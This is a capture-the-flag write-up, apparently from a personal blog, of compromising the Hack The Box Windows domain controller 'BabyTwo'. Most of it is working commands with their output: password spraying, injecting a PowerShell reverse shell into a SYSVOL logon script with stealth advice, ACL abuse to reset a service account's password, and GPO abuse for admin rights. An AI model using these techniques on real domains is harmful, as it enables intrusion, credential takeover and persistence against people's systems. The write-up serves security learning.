---
layout: post
title: "[HTB] BabyTwo"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/BabyTwo_img/img1.png)

- OS: Windows
- Release Date: 25 Sep 2025
- Difficulty: Medium

# Enumeration
## Nmap recon
```
❯ sudo nmap -p- --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 20:55 CEST
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 37.26% done; ETC: 20:58 (0:01:51 remaining)
Nmap scan report for $target
Host is up (0.042s latency).
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49681/tcp open  unknown
62622/tcp open  unknown
62629/tcp open  unknown
62683/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 187.61 seconds
```

Scripts and versions.
```
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49667,49675,49676,49681,62622,62629,62683 -sCV -Pn -oN targeted $target

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 20:59 CEST
Nmap scan report for $target
Host is up (0.041s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-03 18:59:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-03T19:00:03+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-08-18T14:29:57
|_Not valid after:  2026-02-17T14:29:57
|_ssl-date: 2025-10-03T19:00:40+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
62622/tcp open  msrpc         Microsoft Windows RPC
62629/tcp open  msrpc         Microsoft Windows RPC
62683/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-03T19:00:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.16 seconds
```

**What jumps out:** classic Active Directory/DC ports (LDAP/GC, Kerberos, SMB, ADWS, WinRM, RDP). RDP’s `rdp-ntlm-info` exposes the domain/hostnames, so I note:
- Domain: `baby2.vl`
- Hostname: `dc` (Windows Server 2022)
The TTL values around 127 fit a Windows host one hop away. Kerberos time matters, so if there were any skew I’d sync clock before doing any Kerberos-auth actions.

To make name resolution painless, I generate and prepend a hosts file entry using `nxc` and put it at the top of `/etc/hosts`:

```bash
❯ nxc smb $target --generate-hosts-file hosts
SMB         $target   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)

❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## TCP 445: SMB Enumeration
Guest access appears to be enabled, which is a gift on DCs. I test share listing as Guest (empty password):
```bash
❯ nxc smb dc.baby2.vl -u guest -p '' --shares
SMB         $target   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         $target   445    DC               [+] baby2.vl\guest: 
SMB         $target   445    DC               [*] Enumerated shares
SMB         $target   445    DC               Share           Permissions     Remark
SMB         $target   445    DC               -----           -----------     ------
SMB         $target   445    DC               ADMIN$                          Remote Admin
SMB         $target   445    DC               apps            READ            
SMB         $target   445    DC               C$                              Default share
SMB         $target   445    DC               docs                            
SMB         $target   445    DC               homes           READ,WRITE      
SMB         $target   445    DC               IPC$            READ            Remote IPC
SMB         $target   445    DC               NETLOGON        READ            Logon server share 
SMB         $target   445    DC               SYSVOL                          Logon server share
```

**Shares of interest:**
- Domain controller staples: `NETLOGON`, `SYSVOL`
- Custom shares: `apps`, `docs`, `homes`
`homes` often leaks usernames, so I take a look:

```bash
❯ smbclient -N //dc.baby2.vl/homes -c 'ls'
  .                                   D        0  Fri Oct  3 21:07:09 2025
  ..                                  D        0  Tue Aug 22 22:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 22:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 22:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 22:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 22:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 22:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 22:17:06 2023
  library                             D        0  Tue Aug 22 22:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 22:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 22:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 22:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 22:17:06 2023

		6126847 blocks of size 4096. 1945791 blocks available
```

I collect potential usernames from home directory names and then ask `nxc` to spider all readable shares for file metadata (no downloads yet):
```bash
❯ nxc smb dc.baby2.vl -u guest -p '' -M spider_plus

[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] baby2.vl\guest: 
[*] Started module spidering_plus with the following options:
[*]  DOWNLOAD_FLAG: False
[*]     STATS_FLAG: True
[*] EXCLUDE_FILTER: ['print$', 'ipc$']
[*]   EXCLUDE_EXTS: ['ico', 'lnk']
[*]  MAX_FILE_SIZE: 50 KB
[*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
apps            READ            
C$                              Default share
docs                            
homes           READ,WRITE      
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL                          Logon server share 

[+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.234.72.json".
[*] SMB Shares:           8 (ADMIN$, apps, C$, docs, homes, IPC$, NETLOGON, SYSVOL)
[*] SMB Readable Shares:  4 (apps, homes, IPC$, NETLOGON)
[*] SMB Writable Shares:  1 (homes)
[*] SMB Filtered Shares:  1
[*] Total folders found:  12
[*] Total files found:    3
[*] File size average:    966.67 B
[*] File size min:        108 B
[*] File size max:        1.76 KB

```
`The module `spider_plus` allows you to list and dump all files from all readable shares`
```
❯ cat spider.json
───────┬─────────────────────────────────────────────────────
       │ File: spider.json
───────┼─────────────────────────────────────────────────────
   1   │ {
   2   │     "NETLOGON": {
   3   │         "login.vbs": {
   4   │             "atime_epoch": "2025-08-25 13:23:29",
   5   │             "ctime_epoch": "2025-08-25 10:30:24",
   6   │             "mtime_epoch": "2025-08-25 13:23:29",
   7   │             "size": "992 B"
   8   │         }
   9   │     },
  10   │     "apps": {
  11   │         "dev/CHANGELOG": {
  12   │             "atime_epoch": "2023-09-07 21:16:15",
  13   │             "ctime_epoch": "2023-09-07 21:13:40",
  14   │             "mtime_epoch": "2023-09-07 21:20:13",
  15   │             "size": "108 B"
  16   │         },
  17   │         "dev/login.vbs.lnk": {
  18   │             "atime_epoch": "2023-09-07 21:13:23",
  19   │             "ctime_epoch": "2023-09-07 21:13:04",
  20   │             "mtime_epoch": "2023-09-07 21:20:13",
  21   │             "size": "1.76 KB"
  22   │         }
  23   │     },
  24   │     "homes": {}
  25   │ }
───────┴─────────────────────────────────────────────────────
```

From the spider results I spot a small set of files:
- `NETLOGON/login.vbs`
- `apps/dev/CHANGELOG
- `apps/dev/login.vbs.lnk`

### Obtaining the files
I pull those with `smbclient` and read them locally.
```
❯ smbclient -N //dc.baby2.vl/NETLOGON -c 'get login.vbs'
getting file \login.vbs of size 992 as login.vbs (6.0 KiloBytes/sec) (average 6.0 KiloBytes/sec)

❯ smbclient -N //dc.baby2.vl/apps -c 'cd dev; get CHANGELOG'
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)

❯ smbclient -N //dc.baby2.vl/apps -c 'cd dev; get login.vbs.lnk'
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (10.0 KiloBytes/sec) (average 10.0 KiloBytes/sec)
```

### Reading the files
```
❯ cat CHANGELOG
───────┬──────────────────────────────────────────────────────────
       │ File: CHANGELOG
───────┼──────────────────────────────────────────────────────────
   1   │ [0.2]
   2   │ 
   3   │ - Added automated drive mapping
   4   │ 
   5   │ [0.1]
   6   │ 
   7   │ - Rolled out initial version of the domain logon script
───────┴──────────────────────────────────────────────────────────
```
`CHANGELOG` mentions an “automated drive mapping” feature. The shortcut (`.lnk`) is more interesting; I parse it to see exactly where it points:

### lnk
Let's install Astral:
```
❯ curl -LsSf https://astral.sh/uv/install.sh | sh

downloading uv 0.8.22 x86_64-unknown-linux-gnu
no checksums to verify
installing to /home/kali/.local/bin
  uv
  uvx
everything's installed!
```

Now let's install `lnkparse`:
```
❯ uv tool install lnkparse3
Resolved 2 packages in 445ms
Prepared 2 packages in 141ms
Installed 2 packages in 14ms
 + lnkparse3==1.5.2
 + pyyaml==6.0.3
Installed 1 executable: lnkparse
```

### Parsing lnk file
```bash
❯ lnkparse login.vbs.lnk
Windows Shortcut Information:
   Guid: 00021401-0000-0000-C000-000000000046
   Link flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | IsUnicode | EnableTargetMetadata - (524443)
   File flags: FILE_ATTRIBUTE_ARCHIVE - (32)
   Creation time: 2023-08-22 19:28:18.552829+00:00
   Accessed time: 2023-09-02 14:55:51.994608+00:00
   Modified time: 2023-09-02 14:55:51.994608+00:00
   File size: 992
   Icon index: 0
   Windowstyle: SW_SHOWNORMAL
   Hotkey: UNSET - UNSET {0x0000}

   TARGET:
      Items:
      -  Root Folder:
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
      -  Volume Item:
            Flags: '0xf'
            Data: null
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: Windows
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: SYSVOL
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: sysvol
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 1040
            Primary name: baby2.vl
      -  File entry:
            Flags: Is directory
            File size: 0
            File attribute flags: 16
            Primary name: scripts
      -  File entry:
            Flags: Is file
            File size: 992
            File attribute flags: 32
            Primary name: login.vbs

   LINK INFO:
      Link info flags: 3
      Local base path: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\
      Common path suffix: login.vbs
      Location info:
         Drive type: DRIVE_FIXED
         Drive serial number: '0xe6f32485'
         Volume label: ''
      Location: Local

   DATA:
      Relative path: ..\..\..\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
      Working directory: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts

   EXTRA:
      SPECIAL FOLDER LOCATION BLOCK:
         Size: 16
         Special folder id: 36
         Offset: 131
      KNOWN FOLDER LOCATION BLOCK:
         Size: 28
         Known folder id: F38BF404-1D43-42F2-9305-67DE0B28FC23
         Offset: 131
      DISTRIBUTED LINK TRACKER BLOCK:
         Size: 96
         Length: 88
         Version: 0
         Machine identifier: dc
         Droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61
         Droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25
         Birth droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61
         Birth droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25
      METADATA PROPERTIES BLOCK:
         Size: 677
         Property store:
         -  Storage size: 133
            Version: '0x53505331'
            Format id: DABD30ED-0043-4789-A7F8-D013A4736622
            Serialized property values:
            -  Value size: 105
               Id: 100
               Value: scripts (C:\Windows\SYSVOL\sysvol\baby2.vl)
               Value type: VT_LPWSTR
         -  Storage size: 137
            Version: '0x53505331'
            Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
            Serialized property values:
            -  Value size: 109
               Id: 4
               Value: S-1-5-21-213243958-1766259620-4276976267-500
               Value type: VT_LPWSTR
         -  Storage size: 189
            Version: '0x53505331'
            Format id: B725F130-47EF-101A-A5F1-02608C9EEBAC
            Serialized property values:
            -  Value size: 37
               Id: 10
               Value: login.vbs
               Value type: VT_LPWSTR
            -  Value size: 21
               Id: 15
               Value: null
               Value type: VT_FILETIME
            -  Value size: 21
               Id: 12
               Value: null
               Value type: VT_UI8
            -  Value size: 61
               Id: 4
               Value: VBScript Script File
               Value type: VT_LPWSTR
            -  Value size: 21
               Id: 14
               Value: null
               Value type: VT_FILETIME
         -  Storage size: 149
            Version: '0x53505331'
            Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0
            Serialized property values:
            -  Value size: 121
               Id: 30
               Value: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs
               Value type: VT_LPWSTR
         -  Storage size: 57
            Version: '0x53505331'
            Format id: 446D16B1-8DAD-4870-A748-402EA43D788C
            Serialized property values:
            -  Value size: 29
               Id: 104
               Value: null
               Value type: VT_CLSID
```

The shortcut resolves to `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs`. That aligns with a common pattern: a domain logon script centrally stored in `SYSVOL`.

I open `login.vbs` and confirm it maps network drives (e.g., mapping `\\dc.baby2.vl\apps` to a drive letter). That tells me this VBScript runs **at user logon**, which makes it a potential execution primitive if I can edit it.

## Enumerating Users
Guest can’t list users directly, but RID cycling works. I enumerate SIDs to build a user list:
```bash
❯ nxc smb dc.baby2.vl -u guest -p '' --rid-brute \
  | grep SidTypeUser \
  | awk -F'\\\\' '{print $2}' \
  | awk '{print $1}' \
  | tee users

Administrator
Guest
krbtgt
DC$
gpoadm
Joan.Jennings
Mohammed.Harris
Harry.Shaw
Carl.Moore
Ryan.Jenkins
Kieran.Mitchell
Nicola.Lamb
Lynda.Bailey
Joel.Hurst
Amelia.Griffiths
library
```

With a username list in hand, I try the classic “username == password” check. It’s quick, gentle (no bruteforce), and hits a surprising amount of real-world wins:
```bash
❯ nxc smb dc.baby2.vl -u users -p users --no-bruteforce --continue-on-success

[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[-] baby2.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
[-] baby2.vl\Guest:Guest STATUS_LOGON_FAILURE 
[-] baby2.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE 
[-] baby2.vl\DC$:DC$ STATUS_LOGON_FAILURE 
[-] baby2.vl\gpoadm:gpoadm STATUS_LOGON_FAILURE 
[-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE 
[-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE 
[-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE 
[+] baby2.vl\Carl.Moore:Carl.Moore 
[-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE 
[-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE 
[-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE 
[-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE 
[-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE 
[-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
[+] baby2.vl\library:library 
```

**Hits:** two accounts accept their own names as passwords:
- `Carl.Moore:Carl.Moore`
- `library:library`

# Foothold
## BloodHound
Using a low-priv account to collect BloodHound edges is usually enough to reveal attack paths. I collect via LDAP using the `library` creds:
```bash
❯ mkdir blooood
❯ cd blooood

❯ nxc ldap dc.baby2.vl -u library -p library --bloodhound -c All --dns-server $target
[*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl) (signing:None) (channel binding:Never) 
[+] baby2.vl\library:library 
Resolved collection methods: dcom, trusts, session, psremote, container, acl, rdp, group, localadmin, objectprops
Done in 0M 8S
Compressing output into /home/kali/.nxc/logs/DC_10.129.234.72_2025-10-03_213417_bloodhound.zip
```

I ingest the zip into BloodHound-CE and mark compromised users. 
One user object stands out: `Amelia.Griffiths` shows a **LogonScript** attribute that references `login.vbs`. That’s the same script we saw in `SYSVOL`.
![](/img/htb_img/BabyTwo_img/img2.png)

## Gaining Code Execution via SYSVOL (User Shell)
Armed with `library` or `Carl.Moore` creds, I re-check SMB permissions, this time against `SYSVOL`:
```
❯ nxc smb dc.baby2.vl -u library -p library --shares

[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] baby2.vl\library:library 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
apps            READ,WRITE      
C$                              Default share
docs            READ,WRITE      
homes           READ,WRITE      
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

```
❯ nxc smb dc.baby2.vl -u Carl.Moore -p Carl.Moore --shares

[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] baby2.vl\Carl.Moore:Carl.Moore 
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
apps            READ,WRITE      
C$                              Default share
docs            READ,WRITE      
homes           READ,WRITE      
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```

Despite `nxc` reporting read access on `SYSVOL`, I test write permissions directly (trust, but verify):
```
❯ smbclient //dc.baby2.vl/SYSVOL -U 'Carl.Moore%Carl.Moore'
Try "help" to get a list of possible commands.
smb: \> cd baby2.vl/scripts
smb: \baby2.vl\scripts\> dir
  .                                   D        0  Mon Aug 25 10:30:39 2025
  ..                                  D        0  Tue Aug 22 19:43:55 2023
  login.vbs                           A      992  Sat Sep  2 16:55:51 2023

		6126847 blocks of size 4096. 1944931 blocks available

# quick destructive test to check writability;
smb: \baby2.vl\scripts\> put users login.vbs
putting file users as \baby2.vl\scripts\login.vbs (1.4 kB/s) (average 1.4 kB/s)
```

The write **works**. That means I can poison `login.vbs` so that the next user who logs on (like Amelia) triggers my payload.

### Crafting the payload
I append a one-liner that launches a PowerShell reverse shell (any small stager works). The trick is to keep the original drive-mapping logic so users don’t immediately complain—minimal impact, minimal detection. Example flow:
1. Copy the original `login.vbs` locally.
2. Append a VBScript block that spawns PowerShell (base64-encoded command) back to my attacker `nc` listener.
3. Upload the modified script back to `SYSVOL`.

```
WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABO..."

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
```

Listener:
```bash
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.14.148 • 172.18.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Wait a minute or so for a domain user logon event and…

```text
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 10.10.14.148 • 172.18.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from DC~10.129.234.72-Microsoft_Windows_Server_2022_Standard-x64-based_PC 😍️ Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/DC~10.129.234.72-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2025_10_03-22_02_03-363.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
baby2\amelia.griffiths
PS C:\Windows\system32>
```

### User flag
User shell obtained. The user flag is in a non-standard place—right in `C:\`.
```powershell
PS C:\Windows\system32> get-content C:\user.txt
<REDACTED>
PS C:\Windows\system32>
```

# Privilege Escalation
From Amelia’s session I enumerate groups and local filesystem. Nothing spicy in `C:\Users` but the group membership is interesting:
- Custom domain groups: `office`, `legacy`

I pivot back to BloodHound and explore edges from those groups. The **`legacy`** group is the key: it gives `WriteOwner`/`WriteDacl` over the **`GPOADM`** service account and over the **GPO-Management OU**.

![](/img/htb_img/BabyTwo_img/img3.png)

That means from Amelia’s context I can **delegate myself control** over `GPOADM`, then **change its password**.

## Abusing ACLs to Take Over GPOADM
Because I don’t have Amelia’s cleartext password on my box, I perform the ACL abuse from the victim host using PowerView (AMSI/Defender permitting; otherwise transcribe or proxy):

```powershell
# On the victim as Amelia
PS C:\Windows\system32> cd C:\programdata
PS C:\programdata> curl http://10.10.xx.xx/PowerView.ps1 -OutFile PowerView.ps1
PS C:\programdata> . .\PowerView.ps1

# Grant Amelia full rights over the GPOADM user object
Add-DomainObjectAcl -Rights All -TargetIdentity GPOADM -PrincipalIdentity Amelia.Griffiths


# Set a known password for GPOADM
$cred = ConvertTo-SecureString 'S3cure!Passw0rd' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
```

Back on my box, I verify the new creds:

```bash
❯ nxc smb dc.baby2.vl -u GPOADM -p 'S3cure!Passw0rd'
[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False) (Null Auth:True)
[+] baby2.vl\GPOADM:S3cure!Passw0rd 
```

## From GPO Control to Local Administrators
![](/img/htb_img/BabyTwo_img/img4.png)

BloodHound also shows `GPOADM` has **GenericAll** over powerful GPOs. With that and a GUID of a linked GPO (e.g., Default Domain Policy), I can stage code execution via scheduled tasks and add `GPOADM` to the **local Administrators** group on the DC.
I use `pyGPOAbuse` for the heavy lifting:

```bash
❯ git clone https://github.com/Hackndo/pyGPOAbuse.git
❯ cd pyGPOAbuse/
❯ uv add --script pygpoabuse.py -r requirements.txt

# Abuse the GPO to add GPOADM to local Administrators on the DC
❯ uv run --script pygpoabuse.py baby2.vl/GPOADM:'S3cure!Passw0rd' \
  -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
  -command "net localgroup administrators GPOADM /add" -f
      Built impacket==0.12.0
Installed 36 packages in 71ms
[+] ScheduledTask TASK_1194797a created!
```

After Group Policy refresh (scheduled task deployment), `GPOADM` shows up in the local Administrators group. A quick `nxc smb` check should mark the host as **Pwn3d!** as well.

## Admin shell

With admin rights via WinRM:

```bash
❯ evil-winrm -i dc.baby2.vl -u GPOADM -p 'S3cure!Passw0rd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gpoadm\Documents>
```

### Root flag
Then read `root.txt` from the Administrator desktop:
```powershell
*Evil-WinRM* PS C:\Users\gpoadm\Documents> type C:\Users\Administrator\Desktop\root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\gpoadm\Documents>
```

# Notes & Pitfalls
- **SYSVOL writability**: tooling may claim read-only, but SMB ACLs can still allow writes. Always test writes safely (e.g., upload with a different filename first) before replacing production files.
- **Low-and-slow edits**: preserve legitimate logon script functionality to avoid breaking user workflows. Appending is stealthier than replacing.
- **GPO propagation delay**: scheduled tasks via GPO aren’t instant. Give AD time to replicate/refresh.
- **Kerberos time**: if the initial scans show time skew warnings, sync before Kerberos-dependent operations.

---
---